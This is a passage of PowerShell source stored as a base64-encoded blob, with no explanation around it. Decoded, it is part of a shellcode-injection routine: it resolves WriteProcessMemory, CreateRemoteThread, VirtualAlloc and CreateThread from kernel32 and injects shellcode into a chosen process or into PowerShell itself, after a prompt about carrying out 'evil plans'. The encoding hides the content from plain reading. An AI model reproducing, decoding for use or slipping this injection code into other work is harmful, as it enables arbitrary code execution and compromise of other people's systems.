ICAgICAgJFdyaXRlUHJvY2Vzc01lbW9yeUFkZHIgPSBHZXQtUHJvY0FkZHJlc3Mga2VybmVsMzIuZGxsIFdyaXRlUHJvY2Vzc01lbW9yeQogICAgICAgICRXcml0ZVByb2Nlc3NNZW1vcnlEZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQChbSW50UHRyXSwgW0ludFB0cl0sIFtCeXRlW11dLCBbVUludDMyXSwgW1VJbnQzMl0uTWFrZUJ5UmVmVHlwZSgpKSAoW0Jvb2xdKQogICAgICAgICRXcml0ZVByb2Nlc3NNZW1vcnkgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkV3JpdGVQcm9jZXNzTWVtb3J5QWRkciwgJFdyaXRlUHJvY2Vzc01lbW9yeURlbGVnYXRlKQogICAgICAgICRDcmVhdGVSZW1vdGVUaHJlYWRBZGRyID0gR2V0LVByb2NBZGRyZXNzIGtlcm5lbDMyLmRsbCBDcmVhdGVSZW1vdGVUaHJlYWQKICAgICAgICAkQ3JlYXRlUmVtb3RlVGhyZWFkRGVsZWdhdGUgPSBHZXQtRGVsZWdhdGVUeXBlIEAoW0ludFB0cl0sIFtJbnRQdHJdLCBbVUludDMyXSwgW0ludFB0cl0sIFtJbnRQdHJdLCBbVUludDMyXSwgW0ludFB0cl0pIChbSW50UHRyXSkKICAgICAgICAkQ3JlYXRlUmVtb3RlVGhyZWFkID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJENyZWF0ZVJlbW90ZVRocmVhZEFkZHIsICRDcmVhdGVSZW1vdGVUaHJlYWREZWxlZ2F0ZSkKICAgICAgICAkQ2xvc2VIYW5kbGVBZGRyID0gR2V0LVByb2NBZGRyZXNzIGtlcm5lbDMyLmRsbCBDbG9zZUhhbmRsZQogICAgICAgICRDbG9zZUhhbmRsZURlbGVnYXRlID0gR2V0LURlbGVnYXRlVHlwZSBAKFtJbnRQdHJdKSAoW0Jvb2xdKQogICAgICAgICRDbG9zZUhhbmRsZSA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKCRDbG9zZUhhbmRsZUFkZHIsICRDbG9zZUhhbmRsZURlbGVnYXRlKQogICAgCiAgICAgICAgV3JpdGUtVmVyYm9zZSAiSW5qZWN0aW5nIHNoZWxsY29kZSBpbnRvIFBJRDogJFByb2Nlc3NJZCIKICAgICAgICAKICAgICAgICBpZiAoICRGb3JjZSAtb3IgJHBzQ21kbGV0LlNob3VsZENvbnRpbnVlKCAnRG8geW91IHdpc2ggdG8gY2Fycnkgb3V0IHlvdXIgZXZpbCBwbGFucz8nLAogICAgICAgICAgICAgICAgICJJbmplY3Rpbmcgc2hlbGxjb2RlIGluamVjdGluZyBpbnRvICQoKEdldC1Qcm9jZXNzIC1JZCAkUHJvY2Vzc0lkKS5Qcm9jZXNzTmFtZSkgKCRQcm9jZXNzSWQpISIgKSApCiAgICAgICAgewogICAgICAgICAgICBJbmplY3QtUmVtb3RlU2hlbGxjb2RlICRQcm9jZXNzSWQKICAgICAgICB9CiAgICB9CiAgICBlbHNlCiAgICB7CiAgICAgICAgIyBJbmplY3Qgc2hlbGxjb2RlIGludG8gdGhlIGN1cnJlbnRseSBydW5uaW5nIFBvd2VyU2hlbGwgcHJvY2VzcwogICAgICAgICRWaXJ0dWFsQWxsb2NBZGRyID0gR2V0LVByb2NBZGRyZXNzIGtlcm5lbDMyLmRsbCBWaXJ0dWFsQWxsb2MKICAgICAgICAkVmlydHVhbEFsbG9jRGVsZWdhdGUgPSBHZXQtRGVsZWdhdGVUeXBlIEAoW0ludFB0cl0sIFtVSW50MzJdLCBbVUludDMyXSwgW1VJbnQzMl0pIChbSW50UHRyXSkKICAgICAgICAkVmlydHVhbEFsbG9jID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJFZpcnR1YWxBbGxvY0FkZHIsICRWaXJ0dWFsQWxsb2NEZWxlZ2F0ZSkKICAgICAgICAkVmlydHVhbEZyZWVBZGRyID0gR2V0LVByb2NBZGRyZXNzIGtlcm5lbDMyLmRsbCBWaXJ0dWFsRnJlZQogICAgICAgICRWaXJ0dWFsRnJlZURlbGVnYXRlID0gR2V0LURlbGVnYXRlVHlwZSBAKFtJbnRQdHJdLCBbVWludDMyXSwgW1VJbnQzMl0pIChbQm9vbF0pCiAgICAgICAgJFZpcnR1YWxGcmVlID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJFZpcnR1YWxGcmVlQWRkciwgJFZpcnR1YWxGcmVlRGVsZWdhdGUpCiAgICAgICAgJENyZWF0ZVRocmVhZEFkZHIgPSBHZXQtUHJvY0FkZHJlc3Mga2VybmVsMzIuZGxsIENyZWF0ZVRocmVhZAogICAgICAgICRDcmVhdGVUaHJlYWREZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQChbSW50UHRyXSwgW1VJbnQzMl0sIFtJbnRQdHJdLCBbSW50UHRyXSwgW1VJbnQzMl0sIFtJbnRQdHJdKSAoW0ludFB0cl0pCiAgICAgICAgJENyZWF0ZVRocmVhZCA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKCRDcmVhdGVUaHJlYWRBZGRyLCAkQ3JlYXRlVGhyZWFkRGVsZWdhdGUpCiAgICAgICAgJFdhaXRGb3JTaW5nbGVPYmplY3RBZGRyID0gR2V0LVByb2NBZGRyZXNzIGtlcm5lbDMyLmRsbCBXYWl0Rm9yU2luZ2xlT2JqZWN0CiAgICAgICAgJFdhaXRGb3JTaW5nbGVPYmplY3REZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQChbSW50UHRyXSwgW0ludDMyXSkgKFtJbnRdKQogICAgICAgICRXYWl0Rm9yU2luZ2xlT2JqZWN0ID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJFdhaXRGb3JTaW5nbGVPYmplY3RBZGRyLCAkV2FpdEZvclNpbmdsZU9iamVjdERlbGVnYXRlKQogICAgICAgIAogICAgICAgIFdyaXRlLVZlcmJvc2UgIkluamVjdGluZyBzaGVsbGNvZGUgaW50byBQb3dlclNoZWxsIgogICAgICAgIAogICAgICAgIGlmICggJEZvcmNlIC1vciAkcHNDbWRsZXQuU2hvdWxkQ29udGludWUoICdEbyB5b3Ugd2lzaCB0byBjYXJyeSBvdXQgeW91ciBldmlsIHBsYW5zPycsCiAgICAgICAgICAgICAgICAgIkluamVjdGluZyBzaGVsbGNvZGUgaW50byB0aGUgcnVubmluZyBQb3dlclNoZWxsIHByb2Nlc3MhIiApICkKICAgICAgICB7CiAgICAgICAgICAgIEluamVjdC1SZW1vdGVTaGVsbGNvZGUgJFByb2Nlc3NJZAogICAgICAgIH0KICAgIH0gICAKfQ==
